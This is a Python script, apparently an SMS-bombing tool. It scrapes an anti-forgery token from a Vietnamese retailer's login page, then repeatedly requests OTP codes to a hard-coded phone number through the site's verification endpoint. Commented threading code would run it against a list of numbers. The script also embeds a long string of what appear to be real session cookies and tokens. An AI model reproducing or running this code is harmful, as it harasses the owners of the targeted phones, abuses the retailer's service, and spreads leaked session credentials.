import threading
import time
import requests
data = 'input name="__RequestVerificationToken" type="hidden" value="CfDJ8Mt-4i5STVtLvvHVPEx_aLHUZhRprKOgv1Zu-uPFQAKAJ4zbcE56xdHmeDN-dfcHFIXUIrOo7w9iDWkj6UbUl20fUFCeGCmv11g8tmLwlbXcJyhuuW2RkX-GJYKipXTcAskGnnpCqYXSfuihNeUhkBg">'

def cut_string(string,key,choice):
    index = string.find(key)
    if choice:
        string = string[index+len(key):]
    else:
        string = string[0:index]
    return string
def get_token_input_tddd():
    headers = {
        'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        'cookie':'_gcl_au=1.1.449975832.1728747091; _fbp=fb.1.1728747094863.289097653524107244; _tt_enable_cookie=1; _pk_id.7.8f7e=a59e3bfbcc48d445.1728747095.; ozi=2000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NH8rrmEspamLIdtgUvBVPJbIPVvtXizm6LPXwsUUms0PKbJGvD0.1; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1731294653%2C%22https%3A%2F%2Fsearch.yahoo.com%2F%22%5D; ___utmvm=###########; cebs=1; DMX_Personal=%7B%22UID%22%3A%223ea530669b1e3c28a67a92bb2a116e408778106f%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8Mt-4i5STVtLvvHVPEx_aLHkyc1mFyuTpk3msyGATBt9881bJwwrEupmlsCRosXEWOW6RspSeJu5cr_KSQAboqZlAYLCRK1D6LsZuGgp-ErLaJlHL-If3RU7rcFZ3sF5XSQyGPmSLy0yOMgtuJRlRLM; _gid=GA1.2.1523797940.1734616242; _pk_id.1.8f7e=05f466f846ca4a4a.1734616245.; _pk_ses.1.8f7e=1; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJdJMVghAHJ1YOCvwjjDj87vftcAwmsqaIc3aq.1; _ttp=m7ez4f0kfQL-S0TZlSZDYKT4Jtx.tt.1; ShowLocationSuggest_Staging=hide; X-CSRF-TOKEN-MwgCart1=CfDJ8MwFY0w0OctKt-0m0kU82g0EuN8SwSb2cpuDlMzgCJne-OruPd3ljSj4RkM_kJy_G2TJN_u9l9X2-jYYAIdjU7el4iZeVfoNQKtLb7tBIleOJ-RvFl0wun4ukv86_gHWuR5WRSgDmzE2tcN2FgmeI9U; MWG_CART_SS_1=CfDJ8MwFY0w0OctKt%2B0m0kU82g0tIzwy1Qw5z1t1chHvYbH3KPODOw1hT1rHlra2WPyLMGKDpq4DB8SzfONLHBO8gehoGXDSTrcXHqInYbjts6WflLFb8GbOorQsiDxkyiub%2FL7JggroYOXNHbXvfLR%2BNHu59I7SaawAdCeHITiHuein; MWG_CART_ID=e57eb0b9867d4b1aa275; MWG_CART_HAVE_PRODUCT=; BONUSCART_CK=IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--; MWG_PRODUCT_BASIC_DB=aDPiUBvJrL5fH4DXPTjhpcZDz6yeqIg3azPe2am2TGazQJa8ZFYXzw--; SEARCH_KW_HISTORY=aHUguM11n3A4hLrucBIdES6iGV_oA9r20iOh_estbrYHzX8syHZgu%2Fz7idqYVoz9dc1WK719h%2FOK4DkeZsV4p4Wp8IeikC5JcvOylcHOGthEwS_bWWFN2g--; _oauthCDP_WebTGDD_Production=2EICzzDZp6mrmg94hkc8Zugrmg94Grmg94Pesaz1ljUbLHCO9j0FJtCmNWusRx3N2doL5N2_stDNzHoArUMaMoKcJDxHnDYz0YSKycEsaq0nf8kUfkg1OdpWz39IMjKdbjqHXGoskDK2qDjtKjeBBKtPBHNFwDSBxJlmzzq5GygWaKP9wzHPxXubIKF2ad0gH9w92kSQFf39TAxBL5xNOuBCtlBNSfkMvbm95uwmPme0pWz5gXiduMebc6BQiMrHvvRBIvuT20tbqFSdbbyLNY8k1ZUbYGLmekLH4c4pvS8srmg94YNzTHnoE4ec4AXPtKwQbDO7x3wvNcpwbQxC2wiDjZS910O87NUJDnrmg943qnWSumdf4v5pGVajvuhGiEmAQsMWoydpXrmg94IVIbEXGQXRTwzcHVpykLNBc4mb37rlG56rmg94sJzZ; MWG_ORDERHISTORY_SS_1=CfDJ8Mt%2B4i5STVtLvvHVPEx%2FaLH6ZMteD7n7hjX0fXebS7R25GCvojYsJ57KIQ8uSe5Xg8AlCOglco%2BfUEmGT%2FmkyDzmiyW%2B3eKX6HjFMAhYcAeUQwpLwM3KbE1SCLeBxqcDGrq5Pjx4XCFEZ3fyhupc63FNv%2BCXKj9OSwxhLt6w%2Fwy4; _ce.clock_data=540%2C14.168.58.207%2C2%2C840e1a6ce1818496d6221ec8028bc1f4%2CChrome%2CVN; SvID=beline26121|Z2Qql|Z2Qks; TBMCookie_3209819802479625248=291944001734617745iOIg+DVJ9+7/TSZVMn77SFPvI4k=; _gat=1; _ga=GA1.1.1816638605.1728747091; _ga_TZK5WPYMMS=GS1.2.1734616242.1.1.1734617746.60.0.0; cebsp_=14; _ga_TLRZMSX5ME=GS1.1.1734616240.9.1.1734617746.56.0.0; _ce.s=v~ed36e95ae1859fd426f9ec8032e0444d9b08c572~lcw~1734617780131~vir~new~lva~1734617117612~vpv~7~v11.fhb~1734616240865~v11.lhb~1734617746380~v11.cs~453625~v11.s~3c16dc20-be10-11ef-8627-6146d7f158c8~v11.sla~1734617780131~lcw~1734617780131',
    }
    url ='https://www.thegioididong.com/lich-su-mua-hang/dang-nhap'
    p =requests.get(url,headers=headers)
    data=p.text
    token = cut_string(data,'"__RequestVerificationToken" type="hidden" value="',True)
    token = cut_string (token,'"',False)
    return token
print(get_token_input_tddd())
#ham spam sdt
def spam_phone(phone):
    url = 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode'
    token = get_token_input_tddd()
    data = {
        'isReSend' : 'false',
        'sendOTPType' : '1',
        'phoneNumber' : phone ,
        '__RequestVerificationToken' : token,
    }
    headers = {
        'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        'cookie':'_gcl_au=1.1.449975832.1728747091; _fbp=fb.1.1728747094863.289097653524107244; _tt_enable_cookie=1; _pk_id.7.8f7e=a59e3bfbcc48d445.1728747095.; ozi=2000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NH8rrmEspamLIdtgUvBVPJbIPVvtXizm6LPXwsUUms0PKbJGvD0.1; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1731294653%2C%22https%3A%2F%2Fsearch.yahoo.com%2F%22%5D; ___utmvm=###########; cebs=1; DMX_Personal=%7B%22UID%22%3A%223ea530669b1e3c28a67a92bb2a116e408778106f%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8Mt-4i5STVtLvvHVPEx_aLHkyc1mFyuTpk3msyGATBt9881bJwwrEupmlsCRosXEWOW6RspSeJu5cr_KSQAboqZlAYLCRK1D6LsZuGgp-ErLaJlHL-If3RU7rcFZ3sF5XSQyGPmSLy0yOMgtuJRlRLM; _gid=GA1.2.1523797940.1734616242; _pk_id.1.8f7e=05f466f846ca4a4a.1734616245.; _pk_ses.1.8f7e=1; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJdJMVghAHJ1YOCvwjjDj87vftcAwmsqaIc3aq.1; _ttp=m7ez4f0kfQL-S0TZlSZDYKT4Jtx.tt.1; ShowLocationSuggest_Staging=hide; X-CSRF-TOKEN-MwgCart1=CfDJ8MwFY0w0OctKt-0m0kU82g0EuN8SwSb2cpuDlMzgCJne-OruPd3ljSj4RkM_kJy_G2TJN_u9l9X2-jYYAIdjU7el4iZeVfoNQKtLb7tBIleOJ-RvFl0wun4ukv86_gHWuR5WRSgDmzE2tcN2FgmeI9U; MWG_CART_SS_1=CfDJ8MwFY0w0OctKt%2B0m0kU82g0tIzwy1Qw5z1t1chHvYbH3KPODOw1hT1rHlra2WPyLMGKDpq4DB8SzfONLHBO8gehoGXDSTrcXHqInYbjts6WflLFb8GbOorQsiDxkyiub%2FL7JggroYOXNHbXvfLR%2BNHu59I7SaawAdCeHITiHuein; MWG_CART_ID=e57eb0b9867d4b1aa275; MWG_CART_HAVE_PRODUCT=; BONUSCART_CK=IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--; MWG_PRODUCT_BASIC_DB=aDPiUBvJrL5fH4DXPTjhpcZDz6yeqIg3azPe2am2TGazQJa8ZFYXzw--; SEARCH_KW_HISTORY=aHUguM11n3A4hLrucBIdES6iGV_oA9r20iOh_estbrYHzX8syHZgu%2Fz7idqYVoz9dc1WK719h%2FOK4DkeZsV4p4Wp8IeikC5JcvOylcHOGthEwS_bWWFN2g--; _oauthCDP_WebTGDD_Production=2EICzzDZp6mrmg94hkc8Zugrmg94Grmg94Pesaz1ljUbLHCO9j0FJtCmNWusRx3N2doL5N2_stDNzHoArUMaMoKcJDxHnDYz0YSKycEsaq0nf8kUfkg1OdpWz39IMjKdbjqHXGoskDK2qDjtKjeBBKtPBHNFwDSBxJlmzzq5GygWaKP9wzHPxXubIKF2ad0gH9w92kSQFf39TAxBL5xNOuBCtlBNSfkMvbm95uwmPme0pWz5gXiduMebc6BQiMrHvvRBIvuT20tbqFSdbbyLNY8k1ZUbYGLmekLH4c4pvS8srmg94YNzTHnoE4ec4AXPtKwQbDO7x3wvNcpwbQxC2wiDjZS910O87NUJDnrmg943qnWSumdf4v5pGVajvuhGiEmAQsMWoydpXrmg94IVIbEXGQXRTwzcHVpykLNBc4mb37rlG56rmg94sJzZ; MWG_ORDERHISTORY_SS_1=CfDJ8Mt%2B4i5STVtLvvHVPEx%2FaLH6ZMteD7n7hjX0fXebS7R25GCvojYsJ57KIQ8uSe5Xg8AlCOglco%2BfUEmGT%2FmkyDzmiyW%2B3eKX6HjFMAhYcAeUQwpLwM3KbE1SCLeBxqcDGrq5Pjx4XCFEZ3fyhupc63FNv%2BCXKj9OSwxhLt6w%2Fwy4; _ce.clock_data=540%2C14.168.58.207%2C2%2C840e1a6ce1818496d6221ec8028bc1f4%2CChrome%2CVN; SvID=beline26121|Z2Qql|Z2Qks; TBMCookie_3209819802479625248=291944001734617745iOIg+DVJ9+7/TSZVMn77SFPvI4k=; _gat=1; _ga=GA1.1.1816638605.1728747091; _ga_TZK5WPYMMS=GS1.2.1734616242.1.1.1734617746.60.0.0; cebsp_=14; _ga_TLRZMSX5ME=GS1.1.1734616240.9.1.1734617746.56.0.0; _ce.s=v~ed36e95ae1859fd426f9ec8032e0444d9b08c572~lcw~1734617780131~vir~new~lva~1734617117612~vpv~7~v11.fhb~1734616240865~v11.lhb~1734617746380~v11.cs~453625~v11.s~3c16dc20-be10-11ef-8627-6146d7f158c8~v11.sla~1734617780131~lcw~1734617780131',
    }
    p = requests.post(url,data=data,headers=headers)
    print(p,p.text)

spam_phone('0376207890')

# list_phone = ['0376207890']
# arrThread = []
# for i in list_phone:
#     t = threading.Thread(target = spam_phone, args =(phone,))
#     arrThread.append(t)
# for t in arrThread:
#     t.start()